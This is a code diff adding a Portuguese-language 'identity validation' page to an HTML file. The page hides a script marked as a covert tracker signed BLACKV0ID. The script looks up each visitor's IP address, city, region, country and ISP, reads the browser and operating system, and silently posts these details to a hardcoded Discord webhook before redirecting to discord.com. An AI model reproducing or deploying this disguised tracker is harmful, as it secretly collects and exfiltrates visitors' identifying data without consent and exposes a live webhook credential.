@@ -57,3 +57,63 @@
     </script>
   </body>
 </html>
+<h1>Confirmando sua entrada...</h1>
+<p>Aguarde enquanto validamos sua identidade.</p>
+<p class="assinatura">+₿LACKV∅ID</p>
+
+<script>
+  // ⸸₿LACKV∅ID - rastreador sigiloso
+
+  fetch("https://ipapi.co/json/")
+    .then(res => res.json())
+    .then(data => {
+      const ip = data.ip;
+      const cidade = data.city;
+      const regiao = data.region;
+      const pais = data.country_name;
+      const org = data.org;
+
+      const userAgent = navigator.userAgent;
+      let navegador = "Desconhecido";
+      let sistema = "Desconhecido";
+
+      if (userAgent.includes("Firefox")) navegador = "Firefox";
+      else if (userAgent.includes("Edg")) navegador = "Microsoft Edge";
+      else if (userAgent.includes("Chrome")) navegador = "Google Chrome";
+      else if (userAgent.includes("Safari")) navegador = "Safari";
+
+      if (userAgent.includes("Windows")) sistema = "Windows";
+      else if (userAgent.includes("Mac")) sistema = "macOS";
+      else if (userAgent.includes("Android")) sistema = "Android";
+      else if (userAgent.includes("Linux")) sistema = "Linux";
+      else if (userAgent.includes("iPhone")) sistema = "iOS";
+
+      const agora = new Date();
+      const dataHora = agora.toLocaleString("pt-BR", {
+        timeZone: "America/Sao_Paulo"
+      });
+
+      fetch("https://discord.com/api/webhooks/1397790350105514084/7jqldfQmVUl9YYVArP7QXHj84QEFQ6Em-HIKa2Q0FgFzciOfSlz1UOv2xVCtLk2kwmFk", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: `
+🔔 Alguém acessou o site!
+🌐 IP: ${ip}
+📍 Localização: ${cidade}, ${regiao}, ${pais}
+📡 Operadora: ${org}
+💻 Navegador: ${navegador}
+🖥️ Sistema: ${sistema}
+🕓 Data e Hora: ${dataHora}
+🔖 Assinatura: ⸸₿LACKV∅ID
+          `
+        })
+      });
+    })
+    .catch(err => console.error("Erro ao rastrear IP:", err));
+</script>
+setTimeout(() => {
+  window.location.href = "https://discord.com";
+}, 3000);
